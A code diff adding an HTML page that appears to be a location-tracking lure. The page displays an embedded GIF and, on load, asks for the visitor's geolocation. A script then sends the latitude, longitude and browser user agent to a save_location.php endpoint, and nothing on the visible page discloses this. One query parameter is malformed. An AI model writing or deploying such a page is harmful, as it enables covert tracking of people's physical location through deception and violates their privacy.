@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()"> 
+    <iframe src="https://giphy.com/embed/ijEiXYEo9DBxm" width="480" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/arne-van-kauter-ijEiXYEo9DBxm">via GIPHY</a></p>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+const xhttp = new XMLHttpRequest(); 
+    xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&user_agent: " + navigator.userAgent);
+    xhttp.send();
+
+    
+}
+</script>
+
+</body>
+</html>
+
